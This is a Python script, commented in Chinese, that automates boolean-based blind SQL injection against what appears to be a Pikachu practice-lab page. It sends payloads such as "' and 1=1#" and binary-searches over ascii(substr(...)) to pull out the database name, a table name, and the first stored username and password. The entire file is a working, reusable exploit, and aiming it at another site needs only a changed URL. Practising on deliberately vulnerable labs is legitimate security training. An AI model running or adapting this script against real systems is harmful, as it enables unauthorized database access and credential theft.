import requests
import hashlib

url = "https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/sqli/sqli_blind_t.php"

def req_payload(payload):
    post_data = {
        "name": payload,
        "submit": "查询"
    }
    resp = requests.post(url, data=post_data, timeout=12)
    text = resp.text.strip()
    h = hashlib.md5(text.encode("utf‑8")).hexdigest()
    return text, len(text), h


# ---------------------- 获取真假基准 ----------------------
true_text, true_len, true_hash = req_payload("' and 1=1#")
false_text, false_len, false_hash = req_payload("' and 1=2#")

print("=====【基准对比】=====")
print(f"真条件 长度:{true_len}, md5:{true_hash}")
print(f"假条件 长度:{false_len}, md5:{false_hash}")

if true_hash == false_hash:
    print("\n⚠️警告！真假返回页面完全一模一样！手写布尔盲注脚本无法区分，此脚本跑不出结果！请改用sqlmap！")
else:
    print("✅真假页面存在差异，可以布尔盲注！")

# 判定函数：对比md5哈希
def is_true(payload):
    text, l, h = req_payload(payload)
    return h == true_hash


def get_one_char(sql, pos):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' and ascii(substr(({sql}),{pos},1))>{mid}#"
        flag = is_true(payload)
        print(f"pos:{pos}, mid:{mid}, is_true:{flag}")
        if flag:
            low = mid + 1
        else:
            high = mid
    return chr(low)


def dump_data(query, max_len=30):
    result = ""
    for p in range(1, max_len + 1):
        ch = get_one_char(query, p)
        if ord(ch) <= 32:
            break
        result += ch
        print(f"[当前结果]: {result}")
    return result


if __name__ == "__main__":
    print("\n====开始爆破数据库名====")
    db_name = dump_data("database()")
    print(f"\n✅数据库 = {db_name}")

    print("\n====开始爆破第一张表名====")
    table_sql = "select table_name from information_schema.tables where table_schema='pikachu' limit 0,1"
    table_name = dump_data(table_sql)
    print(f"\n✅第一张表 = {table_name}")

    print("\n====开始爆破第一个账号====")
    user_sql = "select username from users limit 0,1"
    user = dump_data(user_sql)
    print(f"\n✅账号 = {user}")

    print("\n====开始爆破第一个密码====")
    pass_sql = "select password from users limit 0,1"
    pwd = dump_data(pass_sql)
    print(f"\n✅密码 = {pwd}")

